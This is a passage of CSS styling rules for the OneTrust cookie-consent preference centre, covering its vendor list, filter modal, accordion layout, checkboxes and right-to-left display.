            margin: 0 0 0 30px;
            height: auto;
            width: auto
        }

        #onetrust-pc-sdk #ot-pc-hdr input::placeholder {
            color: #d4d4d4;
            font-style: italic
        }

        #onetrust-pc-sdk #vendor-search-handler {
            height: 31px;
            width: 100%;
            border-radius: 50px;
            font-size: .8em;
            padding-right: 35px;
            padding-left: 15px;
            float: left;
            margin-left: 15px
        }

        #onetrust-pc-sdk .ot-ven-name {
            display: block;
            width: auto;
            padding-right: 5px
        }

        #onetrust-pc-sdk #ot-lst-cnt {
            overflow-y: auto;
            margin-left: 20px;
            margin-right: 7px;
            width: calc(100% - 27px);
            max-height: calc(100% - 80px);
            height: 100%;
            transform: translate3d(0, 0, 0)
        }

        #onetrust-pc-sdk #ot-pc-lst {
            width: 100%;
            bottom: 100px;
            position: absolute;
            top: 60px
        }

        #onetrust-pc-sdk #ot-pc-lst:not(.ot-enbl-chr) .ot-tgl-cntr .ot-arw-cntr,
        #onetrust-pc-sdk #ot-pc-lst:not(.ot-enbl-chr) .ot-tgl-cntr .ot-arw-cntr * {
            visibility: hidden
        }

        #onetrust-pc-sdk #ot-pc-lst .ot-tgl-cntr {
            right: 12px;
            position: absolute
        }

        #onetrust-pc-sdk #ot-pc-lst .ot-arw-cntr {
            float: right;
            position: relative
        }

        #onetrust-pc-sdk #ot-pc-lst .ot-arw {
            margin-left: 10px
        }

        #onetrust-pc-sdk #ot-pc-lst .ot-acc-hdr {
            overflow: hidden;
            cursor: pointer
        }

        #onetrust-pc-sdk .ot-vlst-cntr {
            overflow: hidden
        }

        #onetrust-pc-sdk #ot-sel-blk {
            overflow: hidden;
            width: 100%;
            position: sticky;
            position: -webkit-sticky;
            top: 0;
            z-index: 3
        }

        #onetrust-pc-sdk #ot-back-arw {
            height: 12px;
            width: 12px
        }

        #onetrust-pc-sdk .ot-lst-subhdr {
            width: 100%;
            display: inline-block
        }

        #onetrust-pc-sdk .ot-search-cntr {
            float: left;
            width: 78%;
            position: relative
        }

        #onetrust-pc-sdk .ot-search-cntr>svg {
            width: 30px;
            height: 30px;
            position: absolute;
            float: left;
            right: -15px
        }

        #onetrust-pc-sdk .ot-fltr-cntr {
            float: right;
            right: 50px;
            position: relative
        }

        #onetrust-pc-sdk #filter-btn-handler {
            background-color: #3860be;
            border-radius: 17px;
            display: inline-block;
            position: relative;
            width: 32px;
            height: 32px;
            -moz-transition: .1s ease;
            -o-transition: .1s ease;
            -webkit-transition: 1s ease;
            transition: .1s ease;
            padding: 0;
            margin: 0
        }

        #onetrust-pc-sdk #filter-btn-handler:hover {
            background-color: #3860be
        }

        #onetrust-pc-sdk #filter-btn-handler svg {
            width: 12px;
            height: 12px;
            margin: 3px 10px 0 10px;
            display: block;
            position: static;
            right: auto;
            top: auto
        }

        #onetrust-pc-sdk .ot-ven-link {
            color: #3860be;
            text-decoration: none;
            font-weight: 100;
            display: inline-block;
            padding-top: 10px;
            transform: translate(0, 1%);
            -o-transform: translate(0, 1%);
            -ms-transform: translate(0, 1%);
            -webkit-transform: translate(0, 1%);
            position: relative;
            z-index: 2
        }

        #onetrust-pc-sdk .ot-ven-link * {
            font-size: inherit
        }

        #onetrust-pc-sdk .ot-ven-link:hover {
            text-decoration: underline
        }

        #onetrust-pc-sdk .ot-ven-hdr {
            width: calc(100% - 160px);
            height: auto;
            float: left;
            word-break: break-word;
            word-wrap: break-word;
            vertical-align: middle;
            padding-bottom: 3px
        }

        #onetrust-pc-sdk .ot-ven-link {
            letter-spacing: .03em;
            font-size: .75em;
            font-weight: 400
        }

        #onetrust-pc-sdk .ot-ven-dets {
            border-radius: 2px;
            background-color: #f8f8f8
        }

        #onetrust-pc-sdk .ot-ven-dets div:first-child p:first-child {
            border-top: none
        }

        #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc:not(:first-child) {
            border-top: 1px solid #e9e9e9
        }

        #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc:nth-child(n+3) p {
            display: inline-block
        }

        #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc:nth-child(n+3) p:nth-of-type(odd) {
            width: 30%
        }

        #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc:nth-child(n+3) p:nth-of-type(even) {
            width: 50%;
            word-break: break-word;
            word-wrap: break-word
        }

        #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc p {
            padding-top: 5px;
            padding-bottom: 5px;
            display: block
        }

        #onetrust-pc-sdk .ot-ven-dets p {
            font-size: .69em;
            text-align: left;
            vertical-align: middle;
            word-break: break-word;
            word-wrap: break-word;
            margin: 0;
            padding-bottom: 10px;
            padding-left: 15px;
            color: #2e3644
        }

        #onetrust-pc-sdk .ot-ven-dets p:first-child {
            padding-top: 5px
        }

        #onetrust-pc-sdk .ot-ven-dets .ot-ven-pur p:first-child {
            border-top: 1px solid #e9e9e9;
            border-bottom: 1px solid #e9e9e9;
            padding-bottom: 5px;
            margin-bottom: 5px;
            font-weight: bold
        }

        #onetrust-pc-sdk #ot-host-lst .ot-sel-all {
            float: right;
            position: relative;
            margin-right: 42px;
            top: 10px
        }

        #onetrust-pc-sdk #ot-host-lst .ot-sel-all input[type=checkbox] {
            width: auto;
            height: auto
        }

        #onetrust-pc-sdk #ot-host-lst .ot-sel-all label {
            height: 20px;
            width: 20px;
            padding-left: 0px
        }

        #onetrust-pc-sdk #ot-host-lst .ot-acc-txt {
            overflow: hidden;
            width: 95%
        }

        #onetrust-pc-sdk .ot-host-hdr {
            position: relative;
            z-index: 1;
            pointer-events: none;
            width: calc(100% - 125px);
            float: left
        }

        #onetrust-pc-sdk .ot-host-name,
        #onetrust-pc-sdk .ot-host-desc {
            display: inline-block;
            width: 90%
        }

        #onetrust-pc-sdk .ot-host-name {
            pointer-events: none
        }

        #onetrust-pc-sdk .ot-host-hdr>a {
            text-decoration: underline;
            font-size: .82em;
            position: relative;
            z-index: 2;
            float: left;
            margin-bottom: 5px;
            pointer-events: initial
        }

        #onetrust-pc-sdk .ot-host-name+a {
            margin-top: 5px
        }

        #onetrust-pc-sdk .ot-host-name,
        #onetrust-pc-sdk .ot-host-name a,
        #onetrust-pc-sdk .ot-host-desc,
        #onetrust-pc-sdk .ot-host-info {
            color: dimgray;
            word-break: break-word;
            word-wrap: break-word
        }

        #onetrust-pc-sdk .ot-host-name,
        #onetrust-pc-sdk .ot-host-name a {
            font-weight: bold;
            font-size: .82em;
            line-height: 1.3
        }

        #onetrust-pc-sdk .ot-host-name a {
            font-size: 1em
        }

        #onetrust-pc-sdk .ot-host-expand {
            margin-top: 3px;
            margin-bottom: 3px;
            clear: both;
            display: block;
            color: #3860be;
            font-size: .72em;
            font-weight: normal
        }

        #onetrust-pc-sdk .ot-host-expand * {
            font-size: inherit
        }

        #onetrust-pc-sdk .ot-host-desc,
        #onetrust-pc-sdk .ot-host-info {
            font-size: .688em;
            line-height: 1.4;
            font-weight: normal
        }

        #onetrust-pc-sdk .ot-host-desc {
            margin-top: 10px
        }

        #onetrust-pc-sdk .ot-host-opt {
            margin: 0;
            font-size: inherit;
            display: inline-block;
            width: 100%
        }

        #onetrust-pc-sdk .ot-host-opt li>div div {
            font-size: .8em;
            padding: 5px 0
        }

        #onetrust-pc-sdk .ot-host-opt li>div div:nth-child(1) {
            width: 30%;
            float: left
        }

        #onetrust-pc-sdk .ot-host-opt li>div div:nth-child(2) {
            width: 70%;
            float: left;
            word-break: break-word;
            word-wrap: break-word
        }

        #onetrust-pc-sdk .ot-host-info {
            border: none;
            display: inline-block;
            width: calc(100% - 10px);
            padding: 10px;
            margin-bottom: 10px;
            background-color: #f8f8f8
        }

        #onetrust-pc-sdk .ot-host-info>div {
            overflow: auto
        }

        #onetrust-pc-sdk #no-results {
            text-align: center;
            margin-top: 30px
        }

        #onetrust-pc-sdk #no-results p {
            font-size: 1em;
            color: #2e3644;
            word-break: break-word;
            word-wrap: break-word
        }

        #onetrust-pc-sdk #no-results p span {
            font-weight: bold
        }

        #onetrust-pc-sdk #ot-fltr-modal {
            width: 100%;
            height: auto;
            display: none;
            -moz-transition: .2s ease;
            -o-transition: .2s ease;
            -webkit-transition: 2s ease;
            transition: .2s ease;
            overflow: hidden;
            opacity: 1;
            right: 0
        }

        #onetrust-pc-sdk #ot-fltr-modal .ot-label-txt {
            display: inline-block;
            font-size: .85em;
            color: dimgray
        }

        #onetrust-pc-sdk #ot-fltr-cnt {
            z-index: 2147483646;
            background-color: #fff;
            position: absolute;
            height: 90%;
            max-height: 300px;
            width: 325px;
            left: 210px;
            margin-top: 10px;
            margin-bottom: 20px;
            padding-right: 10px;
            border-radius: 3px;
            -webkit-box-shadow: 0px 0px 12px 2px #c7c5c7;
            -moz-box-shadow: 0px 0px 12px 2px #c7c5c7;
            box-shadow: 0px 0px 12px 2px #c7c5c7
        }

        #onetrust-pc-sdk .ot-fltr-scrlcnt {
            overflow-y: auto;
            overflow-x: hidden;
            clear: both;
            max-height: calc(100% - 60px)
        }

        #onetrust-pc-sdk #ot-anchor {
            border: 12px solid transparent;
            display: none;
            position: absolute;
            z-index: 2147483647;
            right: 55px;
            top: 75px;
            transform: rotate(45deg);
            -o-transform: rotate(45deg);
            -ms-transform: rotate(45deg);
            -webkit-transform: rotate(45deg);
            background-color: #fff;
            -webkit-box-shadow: -3px -3px 5px -2px #c7c5c7;
            -moz-box-shadow: -3px -3px 5px -2px #c7c5c7;
            box-shadow: -3px -3px 5px -2px #c7c5c7
        }

        #onetrust-pc-sdk .ot-fltr-btns {
            margin-left: 15px
        }

        #onetrust-pc-sdk #filter-apply-handler {
            margin-right: 15px
        }

        #onetrust-pc-sdk .ot-fltr-opt {
            margin-bottom: 25px;
            margin-left: 15px;
            width: 75%;
            position: relative
        }

        #onetrust-pc-sdk .ot-fltr-opt p {
            display: inline-block;
            margin: 0;
            font-size: .9em;
            color: #2e3644
        }

        #onetrust-pc-sdk .ot-chkbox label span {
            font-size: .85em;
            color: dimgray
        }

        #onetrust-pc-sdk .ot-chkbox input[type=checkbox]+label::after {
            content: none;
            color: #fff
        }

        #onetrust-pc-sdk .ot-chkbox input[type=checkbox]:checked+label::after {
            content: ""
        }

        #onetrust-pc-sdk .ot-chkbox input[type=checkbox]:focus+label::before {
            outline-style: solid;
            outline-width: 2px;
            outline-style: auto
        }

        #onetrust-pc-sdk #ot-selall-vencntr,
        #onetrust-pc-sdk #ot-selall-adtlvencntr,
        #onetrust-pc-sdk #ot-selall-hostcntr,
        #onetrust-pc-sdk #ot-selall-licntr,
        #onetrust-pc-sdk #ot-selall-gnvencntr {
            right: 15px;
            position: relative;
            width: 20px;
            height: 20px;
            float: right
        }

        #onetrust-pc-sdk #ot-selall-vencntr label,
        #onetrust-pc-sdk #ot-selall-adtlvencntr label,
        #onetrust-pc-sdk #ot-selall-hostcntr label,
        #onetrust-pc-sdk #ot-selall-licntr label,
        #onetrust-pc-sdk #ot-selall-gnvencntr label {
            float: left;
            padding-left: 0
        }

        #onetrust-pc-sdk #ot-ven-lst:first-child {
            border-top: 1px solid #e2e2e2
        }

        #onetrust-pc-sdk ul {
            list-style: none;
            padding: 0
        }

        #onetrust-pc-sdk ul li {
            position: relative;
            margin: 0;
            padding: 15px 15px 15px 10px;
            border-bottom: 1px solid #e2e2e2
        }

        #onetrust-pc-sdk ul li h3 {
            font-size: .75em;
            color: #656565;
            margin: 0;
            display: inline-block;
            width: 70%;
            height: auto;
            word-break: break-word;
            word-wrap: break-word
        }

        #onetrust-pc-sdk ul li p {
            margin: 0;
            font-size: .7em
        }

        #onetrust-pc-sdk ul li input[type=checkbox] {
            position: absolute;
            cursor: pointer;
            width: 100%;
            height: 100%;
            opacity: 0;
            margin: 0;
            top: 0;
            left: 0
        }

        #onetrust-pc-sdk .ot-cat-item>button:focus,
        #onetrust-pc-sdk .ot-acc-cntr>button:focus,
        #onetrust-pc-sdk li>button:focus {
            outline: #000 solid 2px
        }

        #onetrust-pc-sdk .ot-cat-item>button,
        #onetrust-pc-sdk .ot-acc-cntr>button,
        #onetrust-pc-sdk li>button {
            position: absolute;
            cursor: pointer;
            width: 100%;
            height: 100%;
            margin: 0;
            top: 0;
            left: 0;
            z-index: 1;
            max-width: none;
            border: none
        }

        #onetrust-pc-sdk .ot-cat-item>button[aria-expanded=false]~.ot-acc-txt,
        #onetrust-pc-sdk .ot-acc-cntr>button[aria-expanded=false]~.ot-acc-txt,
        #onetrust-pc-sdk li>button[aria-expanded=false]~.ot-acc-txt {
            margin-top: 0;
            max-height: 0;
            opacity: 0;
            overflow: hidden;
            width: 100%;
            transition: .25s ease-out;
            display: none
        }

        #onetrust-pc-sdk .ot-cat-item>button[aria-expanded=true]~.ot-acc-txt,
        #onetrust-pc-sdk .ot-acc-cntr>button[aria-expanded=true]~.ot-acc-txt,
        #onetrust-pc-sdk li>button[aria-expanded=true]~.ot-acc-txt {
            transition: .1s ease-in;
            margin-top: 10px;
            width: 100%;
            overflow: auto;
            display: block
        }

        #onetrust-pc-sdk .ot-cat-item>button[aria-expanded=true]~.ot-acc-grpcntr,
        #onetrust-pc-sdk .ot-acc-cntr>button[aria-expanded=true]~.ot-acc-grpcntr,
        #onetrust-pc-sdk li>button[aria-expanded=true]~.ot-acc-grpcntr {
            width: auto;
            margin-top: 0px;
            padding-bottom: 10px
        }

        #onetrust-pc-sdk .ot-host-item>button:focus,
        #onetrust-pc-sdk .ot-ven-item>button:focus {
            outline: 0;
            border: 2px solid #000
        }

        #onetrust-pc-sdk .ot-hide-acc>button {
            pointer-events: none
        }

        #onetrust-pc-sdk .ot-hide-acc .ot-plus-minus>*,
        #onetrust-pc-sdk .ot-hide-acc .ot-arw-cntr>* {
            visibility: hidden
        }

        #onetrust-pc-sdk .ot-hide-acc .ot-acc-hdr {
            min-height: 30px
        }

        #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) {
            padding-right: 10px;
            width: calc(100% - 37px);
            margin-top: 10px;
            max-height: calc(100% - 90px)
        }

        #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) #ot-sel-blk {
            background-color: #f9f9fc;
            border: 1px solid #e2e2e2;
            width: calc(100% - 2px);
            padding-bottom: 5px;
            padding-top: 5px
        }

        #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) .ot-sel-all {
            padding-right: 34px
        }

        #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) .ot-sel-all-chkbox {
            width: auto
        }

        #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) ul li {
            border: 1px solid #e2e2e2;
            margin-bottom: 10px
        }

        #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) .ot-acc-cntr>.ot-acc-hdr {
            padding: 10px 0 10px 15px
        }

        #onetrust-pc-sdk.ot-addtl-vendors .ot-sel-all-chkbox {
            float: right
        }

        #onetrust-pc-sdk.ot-addtl-vendors .ot-plus-minus~.ot-sel-all-chkbox {
            right: 34px
        }

        #onetrust-pc-sdk.ot-addtl-vendors #ot-ven-lst:first-child {
            border-top: none
        }

        #onetrust-pc-sdk .ot-acc-cntr {
            position: relative;
            border-left: 1px solid #e2e2e2;
            border-right: 1px solid #e2e2e2;
            border-bottom: 1px solid #e2e2e2
        }

        #onetrust-pc-sdk .ot-acc-cntr input {
            z-index: 1
        }

        #onetrust-pc-sdk .ot-acc-cntr>.ot-acc-hdr {
            background-color: #f9f9fc;
            padding: 5px 0 5px 15px;
            width: auto
        }

        #onetrust-pc-sdk .ot-acc-cntr>.ot-acc-hdr .ot-plus-minus {
            vertical-align: middle;
            top: auto
        }

        #onetrust-pc-sdk .ot-acc-cntr>.ot-acc-hdr .ot-arw-cntr {
            right: 10px
        }

        #onetrust-pc-sdk .ot-acc-cntr>.ot-acc-hdr input {
            z-index: 2
        }

        #onetrust-pc-sdk .ot-acc-cntr>input[type=checkbox]:checked~.ot-acc-hdr {
            border-bottom: 1px solid #e2e2e2
        }

        #onetrust-pc-sdk .ot-acc-cntr>.ot-acc-txt {
            padding-left: 10px;
            padding-right: 10px
        }

        #onetrust-pc-sdk .ot-acc-cntr button[aria-expanded=true]~.ot-acc-txt {
            width: auto
        }

        #onetrust-pc-sdk .ot-acc-cntr .ot-addtl-venbox {
            display: none
        }

        #onetrust-pc-sdk .ot-vlst-cntr {
            margin-bottom: 0;
            width: 100%
        }

        #onetrust-pc-sdk .ot-vensec-title {
            font-size: .813em;
            vertical-align: middle;
            display: inline-block
        }

        #onetrust-pc-sdk .category-vendors-list-handler,
        #onetrust-pc-sdk .category-vendors-list-handler+a {
            margin-left: 0;
            margin-top: 10px
        }

        #onetrust-pc-sdk #ot-selall-vencntr.line-through label::after,
        #onetrust-pc-sdk #ot-selall-adtlvencntr.line-through label::after,
        #onetrust-pc-sdk #ot-selall-licntr.line-through label::after,
        #onetrust-pc-sdk #ot-selall-hostcntr.line-through label::after,
        #onetrust-pc-sdk #ot-selall-gnvencntr.line-through label::after {
            height: auto;
            border-left: 0;
            transform: none;
            -o-transform: none;
            -ms-transform: none;
            -webkit-transform: none;
            left: 5px;
            top: 9px
        }

        #onetrust-pc-sdk #ot-category-title {
            float: left;
            padding-bottom: 10px;
            font-size: 1em;
            width: 100%
        }

        #onetrust-pc-sdk .ot-cat-grp {
            margin-top: 10px
        }

        #onetrust-pc-sdk .ot-cat-item {
            line-height: 1.1;
            margin-top: 10px;
            display: inline-block;
            width: 100%
        }

        #onetrust-pc-sdk .ot-btn-container {
            text-align: right
        }

        #onetrust-pc-sdk .ot-btn-container button {
            display: inline-block;
            font-size: .75em;
            letter-spacing: .08em;
            margin-top: 19px
        }

        #onetrust-pc-sdk #close-pc-btn-handler.ot-close-icon {
            position: absolute;
            top: 10px;
            right: 0;
            z-index: 1;
            padding: 0;
            background-color: transparent;
            border: none
        }

        #onetrust-pc-sdk #close-pc-btn-handler.ot-close-icon:hover {
            opacity: .7
        }

        #onetrust-pc-sdk #close-pc-btn-handler.ot-close-icon svg {
            display: block;
            height: 10px;
            width: 10px
        }

        #onetrust-pc-sdk #clear-filters-handler {
            margin-top: 20px;
            margin-bottom: 10px;
            float: right;
            max-width: 200px;
            text-decoration: none;
            color: #3860be;
            font-size: .9em;
            font-weight: bold;
            background-color: transparent;
            border-color: transparent;
            padding: 1px
        }

        #onetrust-pc-sdk #clear-filters-handler:hover {
            color: #2285f7
        }

        #onetrust-pc-sdk #clear-filters-handler:focus {
            outline: #000 solid 1px
        }

        #onetrust-pc-sdk .ot-accordion-layout.ot-cat-item {
            position: relative;
            border-radius: 2px;
            margin: 0;
            padding: 0;
            border: 1px solid #d8d8d8;
            border-top: none;
            width: calc(100% - 2px);
            float: left
        }

        #onetrust-pc-sdk .ot-accordion-layout.ot-cat-item:first-of-type {
            margin-top: 10px;
            border-top: 1px solid #d8d8d8
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-grpdesc {
            padding-left: 20px;
            padding-right: 20px;
            width: calc(100% - 40px);
            font-size: .812em;
            margin-bottom: 10px;
            margin-top: 15px
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-grpdesc>ul {
            padding-top: 10px
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-grpdesc>ul li {
            padding-top: 0;
            line-height: 1.5;
            padding-bottom: 10px
        }

        #onetrust-pc-sdk .ot-accordion-layout div+.ot-acc-grpdesc {
            margin-top: 5px
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-vlst-cntr:first-child {
            margin-top: 10px
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-vlst-cntr:last-child,
        #onetrust-pc-sdk .ot-accordion-layout .ot-hlst-cntr:last-child {
            margin-bottom: 5px
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-hdr {
            padding-top: 11.5px;
            padding-bottom: 11.5px;
            padding-left: 20px;
            padding-right: 20px;
            width: calc(100% - 40px);
            display: inline-block
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-txt {
            width: 100%;
            padding: 0px
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-subgrp-cntr {
            padding-left: 20px;
            padding-right: 15px;
            padding-bottom: 0;
            width: calc(100% - 35px)
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-subgrp {
            padding-right: 5px
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-grpcntr {
            z-index: 1;
            position: relative
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-cat-header+.ot-arw-cntr {
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
            right: 20px;
            margin-top: -2px
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-cat-header+.ot-arw-cntr .ot-arw {
            width: 15px;
            height: 20px;
            margin-left: 5px;
            color: dimgray
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-cat-header {
            float: none;
            color: #2e3644;
            margin: 0;
            display: inline-block;
            height: auto;
            word-wrap: break-word;
            min-height: inherit
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-vlst-cntr,
        #onetrust-pc-sdk .ot-accordion-layout .ot-hlst-cntr {
            padding-left: 20px;
            width: calc(100% - 20px);
            display: inline-block;
            margin-top: 0px;
            padding-bottom: 2px
        }

        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-hdr {
            position: relative;
            min-height: 25px
        }

        #onetrust-pc-sdk .ot-accordion-layout h4~.ot-tgl,
        #onetrust-pc-sdk .ot-accordion-layout h4~.ot-always-active {
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
            right: 20px
        }

        #onetrust-pc-sdk .ot-accordion-layout h4~.ot-tgl+.ot-tgl {
            right: 95px
        }

        #onetrust-pc-sdk .ot-accordion-layout .category-vendors-list-handler,
        #onetrust-pc-sdk .ot-accordion-layout .category-vendors-list-handler+a {
            margin-top: 5px
        }

        #onetrust-pc-sdk .ot-enbl-chr h4~.ot-tgl,
        #onetrust-pc-sdk .ot-enbl-chr h4~.ot-always-active {
            right: 45px
        }

        #onetrust-pc-sdk .ot-enbl-chr h4~.ot-tgl+.ot-tgl {
            right: 120px
        }

        #onetrust-pc-sdk .ot-enbl-chr .ot-pli-hdr.ot-leg-border-color span:first-child {
            width: 90px
        }

        #onetrust-pc-sdk .ot-enbl-chr li.ot-subgrp>h5+.ot-tgl-cntr {
            padding-right: 25px
        }

        #onetrust-pc-sdk .ot-plus-minus {
            width: 20px;
            height: 20px;
            font-size: 1.5em;
            position: relative;
            display: inline-block;
            margin-right: 5px;
            top: 3px
        }

        #onetrust-pc-sdk .ot-plus-minus span {
            position: absolute;
            background: #27455c;
            border-radius: 1px
        }

        #onetrust-pc-sdk .ot-plus-minus span:first-of-type {
            top: 25%;
            bottom: 25%;
            width: 10%;
            left: 45%
        }

        #onetrust-pc-sdk .ot-plus-minus span:last-of-type {
            left: 25%;
            right: 25%;
            height: 10%;
            top: 45%
        }

        #onetrust-pc-sdk button[aria-expanded=true]~.ot-acc-hdr .ot-arw,
        #onetrust-pc-sdk button[aria-expanded=true]~.ot-acc-hdr .ot-plus-minus span:first-of-type,
        #onetrust-pc-sdk button[aria-expanded=true]~.ot-acc-hdr .ot-plus-minus span:last-of-type {
            transform: rotate(90deg)
        }

        #onetrust-pc-sdk button[aria-expanded=true]~.ot-acc-hdr .ot-plus-minus span:last-of-type {
            left: 50%;
            right: 50%
        }

        #onetrust-pc-sdk #ot-selall-vencntr label,
        #onetrust-pc-sdk #ot-selall-adtlvencntr label,
        #onetrust-pc-sdk #ot-selall-hostcntr label,
        #onetrust-pc-sdk #ot-selall-licntr label {
            position: relative;
            display: inline-block;
            width: 20px;
            height: 20px
        }

        #onetrust-pc-sdk .ot-host-item .ot-plus-minus,
        #onetrust-pc-sdk .ot-ven-item .ot-plus-minus {
            float: left;
            margin-right: 8px;
            top: 10px
        }

        #onetrust-pc-sdk .ot-pli-hdr {
            color: #77808e;
            overflow: hidden;
            padding-top: 7.5px;
            padding-bottom: 7.5px;
            width: calc(100% - 2px);
            border-top-left-radius: 3px;
            border-top-right-radius: 3px
        }

        #onetrust-pc-sdk .ot-pli-hdr span:first-child {
            top: 50%;
            transform: translateY(50%);
            max-width: 90px
        }

        #onetrust-pc-sdk .ot-pli-hdr span:last-child {
            padding-right: 10px;
            max-width: 95px;
            text-align: center
        }

        #onetrust-pc-sdk .ot-li-title {
            float: right;
            font-size: .813em
        }

        #onetrust-pc-sdk .ot-pli-hdr.ot-leg-border-color {
            background-color: #f4f4f4;
            border: 1px solid #d8d8d8
        }

        #onetrust-pc-sdk .ot-pli-hdr.ot-leg-border-color span:first-child {
            text-align: left;
            width: 70px
        }

        #onetrust-pc-sdk li.ot-subgrp>h5,
        #onetrust-pc-sdk .ot-cat-header {
            width: calc(100% - 130px)
        }

        #onetrust-pc-sdk li.ot-subgrp>h5+.ot-tgl-cntr {
            padding-left: 13px
        }

        #onetrust-pc-sdk .ot-acc-grpcntr .ot-acc-grpdesc {
            margin-bottom: 5px
        }

        #onetrust-pc-sdk .ot-acc-grpcntr .ot-subgrp-cntr {
            border-top: 1px solid #d8d8d8
        }

        #onetrust-pc-sdk .ot-acc-grpcntr .ot-vlst-cntr+.ot-subgrp-cntr {
            border-top: none
        }

        #onetrust-pc-sdk .ot-acc-hdr .ot-arw-cntr+.ot-tgl-cntr,
        #onetrust-pc-sdk .ot-acc-txt h4+.ot-tgl-cntr {
            padding-left: 13px
        }

        #onetrust-pc-sdk .ot-pli-hdr~.ot-cat-item .ot-subgrp>h5,
        #onetrust-pc-sdk .ot-pli-hdr~.ot-cat-item .ot-cat-header {
            width: calc(100% - 145px)
        }

        #onetrust-pc-sdk .ot-pli-hdr~.ot-cat-item h5+.ot-tgl-cntr,
        #onetrust-pc-sdk .ot-pli-hdr~.ot-cat-item .ot-cat-header+.ot-tgl {
            padding-left: 28px
        }

        #onetrust-pc-sdk .ot-sel-all-hdr,
        #onetrust-pc-sdk .ot-sel-all-chkbox {
            display: inline-block;
            width: 100%;
            position: relative
        }

        #onetrust-pc-sdk .ot-sel-all-chkbox {
            z-index: 1
        }

        #onetrust-pc-sdk .ot-sel-all {
            margin: 0;
            position: relative;
            padding-right: 23px;
            float: right
        }

        #onetrust-pc-sdk .ot-consent-hdr,
        #onetrust-pc-sdk .ot-li-hdr {
            float: right;
            font-size: .812em;
            line-height: normal;
            text-align: center;
            word-break: break-word;
            word-wrap: break-word
        }

        #onetrust-pc-sdk .ot-li-hdr {
            max-width: 100px;
            padding-right: 10px
        }

        #onetrust-pc-sdk .ot-consent-hdr {
            max-width: 55px
        }

        #onetrust-pc-sdk #ot-selall-licntr {
            display: block;
            width: 21px;
            height: auto;
            float: right;
            position: relative;
            right: 80px
        }

        #onetrust-pc-sdk #ot-selall-licntr label {
            position: absolute
        }

        #onetrust-pc-sdk .ot-ven-ctgl {
            margin-left: 66px
        }

        #onetrust-pc-sdk .ot-ven-litgl+.ot-arw-cntr {
            margin-left: 81px
        }

        #onetrust-pc-sdk .ot-enbl-chr .ot-host-cnt .ot-tgl-cntr {
            width: auto
        }

        #onetrust-pc-sdk #ot-lst-cnt:not(.ot-host-cnt) .ot-tgl-cntr {
            width: auto;
            top: auto;
            height: 20px
        }

        #onetrust-pc-sdk #ot-lst-cnt .ot-chkbox {
            position: relative;
            display: inline-block;
            width: 20px;
            height: 20px
        }

        #onetrust-pc-sdk #ot-lst-cnt .ot-chkbox label {
            position: absolute;
            padding: 0;
            width: 20px;
            height: 20px
        }

        #onetrust-pc-sdk .ot-acc-grpdesc+.ot-leg-btn-container {
            padding-left: 20px;
            padding-right: 20px;
            width: calc(100% - 40px);
            margin-bottom: 5px
        }

        #onetrust-pc-sdk .ot-subgrp .ot-leg-btn-container {
            margin-bottom: 5px
        }

        #onetrust-pc-sdk #ot-ven-lst .ot-leg-btn-container {
            margin-top: 10px
        }

        #onetrust-pc-sdk .ot-leg-btn-container {
            display: inline-block;
            width: 100%;
            margin-bottom: 10px
        }

        #onetrust-pc-sdk .ot-leg-btn-container button {
            height: auto;
            padding: 6.5px 8px;
            margin-bottom: 0;
            letter-spacing: 0;
            font-size: .75em;
            line-height: normal
        }

        #onetrust-pc-sdk .ot-leg-btn-container svg {
            display: none;
            height: 14px;
            width: 14px;
            padding-right: 5px;
            vertical-align: sub
        }

        #onetrust-pc-sdk .ot-active-leg-btn {
            cursor: default;
            pointer-events: none
        }

        #onetrust-pc-sdk .ot-active-leg-btn svg {
            display: inline-block
        }

        #onetrust-pc-sdk .ot-remove-objection-handler {
            text-decoration: underline;
            padding: 0;
            font-size: .75em;
            font-weight: 600;
            line-height: 1;
            padding-left: 10px
        }

        #onetrust-pc-sdk .ot-obj-leg-btn-handler span {
            font-weight: bold;
            text-align: center;
            font-size: inherit;
            line-height: 1.5
        }

        #onetrust-pc-sdk.ot-close-btn-link #close-pc-btn-handler {
            border: none;
            height: auto;
            line-height: 1.5;
            text-decoration: underline;
            font-size: .69em;
            background: none;
            right: 15px;
            top: 15px;
            width: auto;
            font-weight: normal
        }

        #onetrust-pc-sdk[dir=rtl] #ot-back-arw,
        #onetrust-pc-sdk[dir=rtl] input~.ot-acc-hdr .ot-arw {
            transform: rotate(180deg);
            -o-transform: rotate(180deg);
            -ms-transform: rotate(180deg);
            -webkit-transform: rotate(180deg)
        }

        #onetrust-pc-sdk[dir=rtl] input:checked~.ot-acc-hdr .ot-arw {
            transform: rotate(270deg);
            -o-transform: rotate(270deg);
            -ms-transform: rotate(270deg);
            -webkit-transform: rotate(270deg)
        }

        #onetrust-pc-sdk[dir=rtl] .ot-chkbox label::after {
            transform: rotate(45deg);
            -webkit-transform: rotate(45deg);
            -o-transform: rotate(45deg);
            -ms-transform: rotate(45deg);
